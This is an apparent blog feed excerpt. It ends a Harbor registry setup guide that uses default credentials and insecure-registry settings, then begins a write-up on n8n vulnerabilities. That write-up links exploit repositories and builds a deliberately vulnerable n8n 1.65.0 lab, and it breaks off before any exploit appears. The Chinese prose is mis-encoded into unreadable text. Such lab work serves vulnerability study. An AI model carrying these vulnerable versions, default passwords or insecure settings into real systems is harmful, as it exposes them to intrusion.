class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæ‰§è¡Œ install.sh å®‰è£…è„šæœ¬å³å¯</p><p><img src="/blog/2026/02/09/Harbor/IMG-20260210144156765.png"></p><p>å¸å¯† admin:Harbor12345</p><p><img src="/blog/2026/02/09/Harbor/IMG-20260210144258070.png"></p><hr><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><h2 id="docker-ç™»å½•-registry"><a href="#docker-ç™»å½•-registry" class="headerlink" title="docker ç™»å½• registry"></a>docker ç™»å½• registry</h2><blockquote><p>è¿™ä¸€æ­¥ç”¨æ¥ç†Ÿæ‚‰ä¸€ä¸‹ docker login çš„æ“ä½œï¼Œä¸æ˜¯å¿…é¡»çš„</p></blockquote><p>é¦–å…ˆä¿®æ”¹ docker-compose.ymlï¼ŒæŠŠ registry çš„è®¤è¯ç«¯å£æš´éœ²å‡ºæ¥</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">registry</span><span class="token punctuation">:</span>  <span class="token key atrule">image</span><span class="token punctuation">:</span> goharbor/registry<span class="token punctuation">-</span>photon<span class="token punctuation">:</span>v2.14.2  <span class="token key atrule">container_name</span><span class="token punctuation">:</span> registry  <span class="token key atrule">restart</span><span class="token punctuation">:</span> always  <span class="token key atrule">cap_drop</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> ALL  <span class="token key atrule">cap_add</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> CHOWN    <span class="token punctuation">-</span> SETGID    <span class="token punctuation">-</span> SETUID  <span class="token key atrule">volumes</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> /Users/mashiro/DevOps/Harbor/opt/registry<span class="token punctuation">:</span>/storage<span class="token punctuation">:</span>z    <span class="token punctuation">-</span> ./common/config/registry/<span class="token punctuation">:</span>/etc/registry/<span class="token punctuation">:</span>z    <span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> bind      <span class="token key atrule">source</span><span class="token punctuation">:</span> /Users/mashiro/DevOps/Harbor/opt/secret/registry/root.crt      <span class="token key atrule">target</span><span class="token punctuation">:</span> /etc/registry/root.crt    <span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> bind      <span class="token key atrule">source</span><span class="token punctuation">:</span> ./common/config/shared/trust<span class="token punctuation">-</span>certificates      <span class="token key atrule">target</span><span class="token punctuation">:</span> /harbor_cust_cert  <span class="token key atrule">networks</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> harbor  <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> log  <span class="token key atrule">logging</span><span class="token punctuation">:</span>    <span class="token key atrule">driver</span><span class="token punctuation">:</span> <span class="token string">"syslog"</span>    <span class="token key atrule">options</span><span class="token punctuation">:</span>      <span class="token key atrule">syslog-address</span><span class="token punctuation">:</span> <span class="token string">"tcp://localhost:1514"</span>      <span class="token key atrule">tag</span><span class="token punctuation">:</span> <span class="token string">"registry"</span>  <span class="token key atrule">ports</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> 5000<span class="token punctuation">:</span><span class="token number">5000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå°è¯•ç™»å½•</p><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">â¯ docker login 192.168.77.94:5000Username: adminPassword: Error response from daemon: Get &quot;https:&#x2F;&#x2F;192.168.77.94:5000&#x2F;v2&#x2F;&quot;: http: server gave HTTP response to HTTPS client<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>Docker è‡ªä» 1.3.x ä¹‹å docker registry äº¤äº’é»˜è®¤ä½¿ç”¨çš„æ˜¯ HTTPSï¼Œä½†æ˜¯æˆ‘ä»¬æ­å»ºç§æœ‰é•œåƒé»˜è®¤ä½¿ç”¨çš„æ˜¯ HTTP æœåŠ¡ï¼Œæ‰€ä»¥ä¸ç§æœ‰é•œåƒäº¤äº’æ—¶ä»¥ https è®¿é—®ä¼šå¯¼è‡´å‡ºé”™</p></blockquote><p>è§£å†³åŠæ³•æ˜¯ä¿®æ”¹ daemon.jsonï¼ŒåŠ ä¸Šè¿™ä¸€æ®µ</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"insecure-registries"</span><span class="token operator">:</span> <span class="token punctuation">[</span> <span class="token string">"192.168.77.94"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2026/02/09/Harbor/IMG-20260210153124191.png"></p><p>ç„¶åé‡å¯ docker æœåŠ¡</p><p>æ¥ä¸‹æ¥å°±èƒ½è¿æ¥äº†ï¼Œå¸å¯†åœ¨ common&#x2F;config&#x2F;core&#x2F;env ä¸‹çš„ <code>REGISTRY_CREDENTIAL_USERNAME</code> å’Œ <code>REGISTRY_CREDENTIAL_PASSWORD</code></p><p><img src="/blog/2026/02/09/Harbor/IMG-20260210153524839.png"></p><hr><h2 id="åˆ›å»ºæ–°é¡¹ç›®å¹¶ä¸Šä¼ "><a href="#åˆ›å»ºæ–°é¡¹ç›®å¹¶ä¸Šä¼ " class="headerlink" title="åˆ›å»ºæ–°é¡¹ç›®å¹¶ä¸Šä¼ "></a>åˆ›å»ºæ–°é¡¹ç›®å¹¶ä¸Šä¼ </h2><p>åœ¨ Harbor ä¸Šåˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›® test ä¾›ä¸Šä¼ ä½¿ç”¨</p><p><img src="/blog/2026/02/09/Harbor/IMG-20260210160126089.png"></p><p>è¿˜éœ€è¦æŠŠ 8999 ç«¯å£ä¹ŸåŠ å…¥åˆ° insecure-registries ä¸­</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"insecure-registries"</span><span class="token operator">:</span> <span class="token punctuation">[</span>  <span class="token string">"192.168.77.94:5000"</span><span class="token punctuation">,</span>  <span class="token string">"192.168.77.94:8999"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>é‡å¯ docker æœåŠ¡</p><p>å°è¯•æ¨é€é•œåƒ</p><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">â¯ docker tag busybox:latest 192.168.77.94:8999&#x2F;test&#x2F;busybox:latestâ¯ docker push 192.168.77.94:8999&#x2F;test&#x2F;busybox:latestThe push refers to repository [192.168.77.94:8999&#x2F;test&#x2F;busybox]499bcf3c8ead: Unavailable push access denied, repository does not exist or may require authorization: authorization failed: no basic auth credentials<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶éœ€è¦ç™»å½• 8999ï¼Œå¸å¯†å°±æ˜¯ web ç«¯ç™»å½•çš„</p><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">â¯ docker login 192.168.77.94:8999Username: adminPassword: Login Succeeded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2026/02/09/Harbor/IMG-20260210161203415.png"></p><p><img src="/blog/2026/02/09/Harbor/IMG-20260210161234839.png"></p><p>æ€è€ƒğŸ¤”ï¼šé‚£å…¶å®å‰é¢å¥½åƒæ²¡æœ‰å¿…è¦ç™»å½• 5000 ç«¯å£ï¼Œç›´æ¥ç™»å½• 8999 ç«¯å£å°±è¡Œäº†</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/sowler/p/18242819&quot;&gt;https://www.cnblogs.com/sowler/p/18242819&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/gm19900510/Harbor_Install&quot;&gt;https://github.com/gm19900510/Harbor_Install&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Dev" scheme="http://c1oudfl0w0.github.io/blog/categories/Dev/"/>
    
    
  </entry>
  
  <entry>
    <title>n8nä¸å®ƒçš„å¤šä¸ªæ¼æ´</title>
    <link href="http://c1oudfl0w0.github.io/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/"/>
    <id>http://c1oudfl0w0.github.io/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/</id>
    <published>2026-02-04T02:38:11.000Z</published>
    <updated>2026-02-10T09:57:56.451Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è·Ÿè·Ÿæœ€æ–°æœ€çƒ­</p><p>å‚è€ƒï¼š</p><p><a href="https://n8n.akashio.com/about">https://n8n.akashio.com/about</a></p><p><a href="https://docs.n8n.io/try-it-out/quickstart/#step-one-open-a-workflow-template-and-sign-up-for-n8n-cloud">https://docs.n8n.io/try-it-out/quickstart/#step-one-open-a-workflow-template-and-sign-up-for-n8n-cloud</a></p><p><a href="https://datawhalechina.github.io/hello-agents/#/./chapter5/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%9F%BA%E4%BA%8E%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%99%BA%E8%83%BD%E4%BD%93%E6%90%AD%E5%BB%BA?id=_54-%e5%b9%b3%e5%8f%b0%e4%b8%89%ef%bc%9an8n">https://datawhalechina.github.io/hello-agents/#/./chapter5/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%9F%BA%E4%BA%8E%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%99%BA%E8%83%BD%E4%BD%93%E6%90%AD%E5%BB%BA?id=_54-%e5%b9%b3%e5%8f%b0%e4%b8%89%ef%bc%9an8n</a></p><p><a href="https://github.com/Chocapikk/CVE-2026-21858">https://github.com/Chocapikk/CVE-2026-21858</a></p><p><a href="https://www.cyera.com/research-labs/ni8mare-unauthenticated-remote-code-execution-in-n8n-cve-2026-21858">https://www.cyera.com/research-labs/ni8mare-unauthenticated-remote-code-execution-in-n8n-cve-2026-21858</a></p><p><a href="https://0d000721999.github.io/p/cve-2026-21858%E5%A4%8D%E7%8E%B0n8n%E6%9C%AA%E6%8E%88%E6%9D%83rce">https://0d000721999.github.io/p/cve-2026-21858%E5%A4%8D%E7%8E%B0n8n%E6%9C%AA%E6%8E%88%E6%9D%83rce</a></p><p><a href="https://github.com/wioui/n8n-CVE-2025-68613-exploit">https://github.com/wioui/n8n-CVE-2025-68613-exploit</a></p><p><a href="https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/n8n-Pyodide-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2025-68668.md">https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/n8n-Pyodide-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2025-68668.md</a></p><p><a href="https://www.smartkeyss.com/post/cve-2025-68668-breaking-out-of-the-python-sandbox-in-n8n">https://www.smartkeyss.com/post/cve-2025-68668-breaking-out-of-the-python-sandbox-in-n8n</a></p><span id="more"></span><hr><h1 id="åŸºç¡€æ¦‚å¿µ"><a href="#åŸºç¡€æ¦‚å¿µ" class="headerlink" title="åŸºç¡€æ¦‚å¿µ"></a>åŸºç¡€æ¦‚å¿µ</h1><h2 id="ä½ä»£ç -Low-Code"><a href="#ä½ä»£ç -Low-Code" class="headerlink" title="ä½ä»£ç  Low-Code"></a>ä½ä»£ç  Low-Code</h2><p>è¿™æ˜¯ä¸€ç§å¯è§†åŒ–çš„è½¯ä»¶å¼€å‘æ–¹æ³•</p><p>ä¼ ç»Ÿçš„è½¯ä»¶å¼€å‘éœ€è¦ä½¿ç”¨ C#ã€Java å’Œ Python ç­‰ç¼–ç¨‹è¯­è¨€è¿›è¡Œå®Œå…¨æ‰‹åŠ¨ç¼–ç ã€‚ç”±äºæ‰€æœ‰åŠŸèƒ½éƒ½æ˜¯ä¸“ä¸šå¼€å‘äººå‘˜ä»é›¶å¼€å§‹æ„å»ºçš„ï¼Œå› æ­¤ä¸€åˆ‡éƒ½å¯ä»¥è‡ªå®šä¹‰ã€‚ä½†æ˜¯ç”±äºé«˜åº¦ä¸“ä¸šåŒ–ä¼šå¯¼è‡´æŠ€æœ¯å›¢é˜Ÿä¸éæŠ€æœ¯å›¢é˜Ÿä¹‹é—´çš„æ²Ÿé€šé¸¿æ²Ÿè¾ƒå¤§ã€‚</p><p><strong>ä½ä»£ç å¼€å‘</strong>åˆ™æ˜¯ä¸€ä¸ªå¯è§†åŒ–æµç¨‹ï¼Œå¦‚åŒç§¯æœ¨ç¼–ç¨‹ï¼Œæ‰€æœ‰æŠ€èƒ½æ°´å¹³çš„ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨å…¥é—¨åº”ç”¨ã€é¢„æ„å»ºå’Œå¯é‡ç”¨çš„ç»„ä»¶ä»¥åŠæ¨¡æ¿ï¼Œæ›´å¿«åœ°æ„å»ºä¸šåŠ¡åº”ç”¨ç¨‹åºã€‚ä¸€äº›ç»å…¸çš„ä½ä»£ç å¹³å°å¦‚<a href="https://github.com/jeecgboot/JeecgBoot">ç§¯æœ¨æŠ¥è¡¨ JeecgBoot</a></p><p>æœ€è¿‘æ¯”è¾ƒç«çš„ <a href="https://github.com/Comfy-Org/ComfyUI">ComfyUI</a>ã€<a href="https://github.com/langgenius/dify">Dify</a> ä¹Ÿæ˜¯ä½ä»£ç å¹³å°</p><hr><h2 id="n8n"><a href="#n8n" class="headerlink" title="n8n"></a>n8n</h2><p>ä¸€ä¸ªé€šç”¨çš„å·¥ä½œæµè‡ªåŠ¨åŒ–å¹³å°ï¼ŒåŸºæœ¬æ¦‚å¿µç”± <strong>èŠ‚ç‚¹ (Node)</strong>Â å’ŒÂ <strong>å·¥ä½œæµ (Workflow)</strong> ç»„æˆ</p><ul><li>**èŠ‚ç‚¹ (Node)**ï¼šèŠ‚ç‚¹æ˜¯å·¥ä½œæµä¸­æ‰§è¡Œå…·ä½“æ“ä½œçš„æœ€å°å•å…ƒã€‚ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆä¸€ä¸ªå…·æœ‰ç‰¹å®šåŠŸèƒ½çš„â€œç§¯æœ¨å—â€ã€‚n8n æä¾›äº†æ•°ç™¾ç§é¢„ç½®èŠ‚ç‚¹ï¼Œæ¶µç›–äº†ä»å‘é€é‚®ä»¶ã€è¯»å†™æ•°æ®åº“ã€è°ƒç”¨ API åˆ°å¤„ç†æ–‡ä»¶ç­‰å„ç§å¸¸è§æ“ä½œã€‚æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰è¾“å…¥å’Œè¾“å‡ºï¼Œå¹¶æä¾›å›¾å½¢åŒ–çš„é…ç½®ç•Œé¢ã€‚èŠ‚ç‚¹å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼š<ul><li>**è§¦å‘èŠ‚ç‚¹ (Trigger Node)**ï¼šå®ƒæ˜¯æ•´ä¸ªå·¥ä½œæµçš„èµ·ç‚¹ï¼Œè´Ÿè´£å¯åŠ¨æµç¨‹ã€‚ä¾‹å¦‚ï¼Œâ€œå½“æ”¶åˆ°ä¸€å°æ–°çš„ Gmail é‚®ä»¶æ—¶â€ã€â€œæ¯å°æ—¶å®šæ—¶è§¦å‘ä¸€æ¬¡â€æˆ–â€œå½“æ¥æ”¶åˆ°ä¸€ä¸ª Webhook è¯·æ±‚æ—¶â€ã€‚ä¸€ä¸ªå·¥ä½œæµå¿…é¡»æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªè§¦å‘èŠ‚ç‚¹ã€‚</li><li>**å¸¸è§„èŠ‚ç‚¹ (Regular Node)**ï¼šè´Ÿè´£å¤„ç†å…·ä½“çš„æ•°æ®å’Œé€»è¾‘ã€‚ä¾‹å¦‚ï¼Œâ€œè¯»å– Google Sheets è¡¨æ ¼â€ã€â€œè°ƒç”¨ OpenAI æ¨¡å‹â€æˆ–â€œåœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡è®°å½•â€ã€‚</li></ul></li><li>**å·¥ä½œæµ (Workflow)**ï¼šå·¥ä½œæµæ˜¯ç”±å¤šä¸ªèŠ‚ç‚¹è¿æ¥è€Œæˆçš„è‡ªåŠ¨åŒ–æµç¨‹å›¾ã€‚å®ƒå®šä¹‰äº†æ•°æ®ä»è§¦å‘èŠ‚ç‚¹å¼€å§‹ï¼Œå¦‚ä½•ä¸€æ­¥æ­¥åœ°åœ¨ä¸åŒèŠ‚ç‚¹ä¹‹é—´ä¼ é€’ã€è¢«å¤„ç†ï¼Œå¹¶æœ€ç»ˆå®Œæˆé¢„è®¾ä»»åŠ¡çš„å®Œæ•´è·¯å¾„ã€‚æ•°æ®åœ¨èŠ‚ç‚¹ä¹‹é—´ä»¥ç»“æ„åŒ–çš„ JSON æ ¼å¼è¿›è¡Œä¼ é€’ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥ç²¾ç¡®åœ°æ§åˆ¶æ¯ä¸€ä¸ªç¯èŠ‚çš„è¾“å…¥å’Œè¾“å‡ºã€‚</li></ul><p>n8n çš„çœŸæ­£å¨åŠ›åœ¨äºå…¶å¼ºå¤§çš„â€œè¿æ¥â€èƒ½åŠ›ã€‚å®ƒå¯ä»¥å°†åŸæœ¬å­¤ç«‹çš„åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ï¼ˆå¦‚ä¼ä¸šå†…éƒ¨çš„ CRMã€å¤–éƒ¨çš„ç¤¾äº¤åª’ä½“å¹³å°ã€ä½ çš„æ•°æ®åº“ä»¥åŠå¤§è¯­è¨€æ¨¡å‹ï¼‰ä¸²è”èµ·æ¥ï¼Œå®ç°è¿‡å»éœ€è¦å¤æ‚ç¼–ç æ‰èƒ½å®Œæˆçš„ç«¯åˆ°ç«¯ä¸šåŠ¡æµç¨‹è‡ªåŠ¨åŒ–</p><hr><h2 id="REST-API"><a href="#REST-API" class="headerlink" title="REST API"></a>REST API</h2><p><a href="https://www.ibm.com/cn-zh/think/topics/rest-apis">https://www.ibm.com/cn-zh/think/topics/rest-apis</a></p><p><strong>Representational State Transferï¼ˆè¡¨ç°å±‚çŠ¶æ€è½¬ç§»ï¼‰</strong>ï¼Œç®€ç§° REST</p><p>REST API æ˜¯ä¸¤ä¸ªè®¡ç®—æœºç³»ç»Ÿåœ¨ web æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¸­ä½¿ç”¨ HTTP æŠ€æœ¯è¿›è¡Œé€šä¿¡çš„ä¸€ç§æ–¹å¼</p><p>ç›¸è¾ƒäº SOAP æˆ– XML-RPC è¿™ç±»è§„å®šäº†ä¸¥æ ¼æ¡†æ¶çš„ APIï¼Œå¼€å‘è€…å¯ä»¥ä½¿ç”¨å‡ ä¹ä»»ä½•ç¼–ç¨‹è¯­è¨€å¼€å‘ REST APIï¼Œå¹¶æ”¯æŒå„ç§æ•°æ®æ ¼å¼ï¼Œåªéœ€è¦æ»¡è¶³ä»¥ä¸‹è®¾è®¡åŸåˆ™ï¼š</p><ul><li><strong>ç»Ÿä¸€æ¥å£</strong>ï¼šæ— è®ºè¯·æ±‚æ¥è‡ªä½•å¤„ï¼Œå¯¹åŒä¸€èµ„æºå‘å‡ºçš„æ‰€æœ‰ API è¯·æ±‚éƒ½åº”è¯¥çœ‹èµ·æ¥ç›¸åŒã€‚ï¼ˆé™¤éè®¾è®¡ä¸Šå°±æ˜¯éšæœºè¿”å›ï¼‰REST API åº”ç¡®ä¿åŒä¸€ä»½æ•°æ®ï¼ˆä¾‹å¦‚ï¼Œç”¨æˆ·çš„å§“åæˆ–ç”µå­é‚®ä»¶åœ°å€ï¼‰ä»…å±äºä¸€ä¸ªç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ (URI)ã€‚èµ„æºä¸åº”å¤ªå¤§ï¼Œä½†åº”åŒ…å«å®¢æˆ·å¯èƒ½éœ€è¦çš„æ¯æ¡ä¿¡æ¯ã€‚</li><li><strong>å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨è§£è€¦</strong>ï¼šåœ¨ REST API è®¾è®¡ä¸­ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åº”ç”¨ç¨‹åºå¿…é¡»å®Œå…¨ç›¸äº’ç‹¬ç«‹ã€‚å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºåº”è¯¥çŸ¥é“çš„å”¯ä¸€ä¿¡æ¯æ˜¯æ‰€è¯·æ±‚èµ„æºçš„ URIï¼Œå®ƒä¸èƒ½ä»¥ä»»ä½•å…¶ä»–æ–¹å¼ä¸æœåŠ¡å™¨åº”ç”¨ç¨‹åºäº¤äº’ã€‚åŒæ ·ï¼Œé™¤äº†é€šè¿‡ HTTP å°†å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºä¼ é€’åˆ°æ‰€è¯·æ±‚çš„æ•°æ®å¤–ï¼ŒæœåŠ¡å™¨åº”ç”¨ç¨‹åºä¸åº”ä¿®æ”¹å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºã€‚</li><li><strong>æ— çŠ¶æ€</strong>ï¼šREST API æ˜¯æ— çŠ¶æ€çš„ï¼Œè¿™æ„å‘³ç€æ¯ä¸ªè¯·æ±‚éƒ½éœ€è¦åŒ…å«å¤„ç†å®ƒæ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ã€‚æ¢è¨€ä¹‹ï¼ŒREST API ä¸éœ€è¦ä»»ä½•æœåŠ¡å™¨ç«¯ä¼šè¯ã€‚ä¸å…è®¸æœåŠ¡å™¨åº”ç”¨ç¨‹åºå­˜å‚¨ä¸å®¢æˆ·ç«¯è¯·æ±‚ç›¸å…³çš„ä»»ä½•æ•°æ®ã€‚</li><li><strong>å¯ç¼“å­˜æ€§</strong>ï¼šå¦‚æœå¯èƒ½ï¼Œèµ„æºåº”è¯¥å¯ä»¥åœ¨å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨ç«¯ç¼“å­˜ã€‚æœåŠ¡å™¨å“åº”è¿˜éœ€è¦åŒ…å«æœ‰å…³æ˜¯å¦å…è®¸å¯¹å·²äº¤ä»˜èµ„æºè¿›è¡Œç¼“å­˜çš„ä¿¡æ¯ã€‚ç›®æ ‡æ˜¯æé«˜å®¢æˆ·ç«¯çš„æ€§èƒ½ï¼ŒåŒæ—¶æé«˜æœåŠ¡å™¨ç«¯çš„å¯æ‰©å±•æ€§ã€‚</li><li><strong>åˆ†å±‚ç³»ç»Ÿæ¶æ„</strong>ï¼šè¯·æ±‚çš„å®¢æˆ·ç«¯ä¸éœ€è¦çŸ¥é“å®ƒæ˜¯å¦åœ¨ä¸å®é™…çš„æœåŠ¡å™¨ã€ä»£ç†æˆ–ä»»ä½•å…¶ä»–ä¸­é—´äººè¿›è¡Œé€šä¿¡ã€‚</li><li><strong>æŒ‰éœ€ç¼–ç ï¼ˆå¯é€‰ï¼‰</strong>ï¼šREST API é€šå¸¸å‘é€é™æ€èµ„æºï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå“åº”ä¹Ÿå¯ä»¥åŒ…å«å¯æ‰§è¡Œä»£ç ï¼ˆä¾‹å¦‚ Java å°ç¨‹åºï¼‰ã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œä»£ç åªåº”æŒ‰éœ€è¿è¡Œã€‚</li></ul><hr><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ç›´æ¥ä½¿ç”¨ <a href="https://github.com/Chocapikk/CVE-2026-21858">https://github.com/Chocapikk/CVE-2026-21858</a> çš„æ¼æ´ç‰ˆæœ¬</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> node:20-slim</span><span class="token instruction"><span class="token keyword">RUN</span> npm install -g n8n@1.65.0</span><span class="token instruction"><span class="token keyword">EXPOSE</span> 5678</span><span class="token instruction"><span class="token keyword">CMD</span> [<span class="token string">"n8n"</span>, <span class="token string">"start"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">n8n</span><span class="token punctuation">:</span>    <span class="token key atrule">build</span><span class="token punctuation">:</span> .    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> n8n<span class="token punctuation">-</span>vulnerable    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"5678:5678"</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> N8N_SECURE_COOKIE=false      <span class="token punctuation">-</span> WEBHOOK_URL=http<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>5678/    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./init<span class="token punctuation">:</span>/init<span class="token punctuation">:</span>ro    <span class="token key atrule">entrypoint</span><span class="token punctuation">:</span> <span class="token punctuation">></span><span class="token scalar string">      bash -c "        apt-get update &amp;&amp; apt-get install -y curl > /dev/null 2>&amp;1        n8n start &amp;        sleep 15        bash /init/setup.sh        wait      "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>setup.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">BASE_URL</span><span class="token operator">=</span><span class="token string">"http://127.0.0.1:5678"</span><span class="token builtin class-name">echo</span> <span class="token string">"[*] Waiting for n8n..."</span><span class="token keyword">until</span> <span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token string">"<span class="token variable">$BASE_URL</span>/rest/settings"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-q</span> versionCli<span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token function">sleep</span> <span class="token number">2</span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token string">"[+] n8n is ready"</span><span class="token builtin class-name">echo</span> <span class="token string">"[*] Creating admin..."</span><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-X</span> POST <span class="token string">"<span class="token variable">$BASE_URL</span>/rest/owner/setup"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-H</span> <span class="token string">"Content-Type: application/json"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-d</span> <span class="token string">'&#123;"email":"admin@exploit.local","firstName":"Admin","lastName":"Exploit","password":"ExploitLab123!"&#125;'</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>[*] Logging in..."</span><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-X</span> POST <span class="token string">"<span class="token variable">$BASE_URL</span>/rest/login"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-H</span> <span class="token string">"Content-Type: application/json"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-c</span> /tmp/cookies.txt <span class="token punctuation">\</span>    <span class="token parameter variable">-d</span> <span class="token string">'&#123;"email":"admin@exploit.local","password":"ExploitLab123!"&#125;'</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>[*] Creating workflow..."</span><span class="token assign-left variable">RESP</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-X</span> POST <span class="token string">"<span class="token variable">$BASE_URL</span>/rest/workflows"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-H</span> <span class="token string">"Content-Type: application/json"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-b</span> 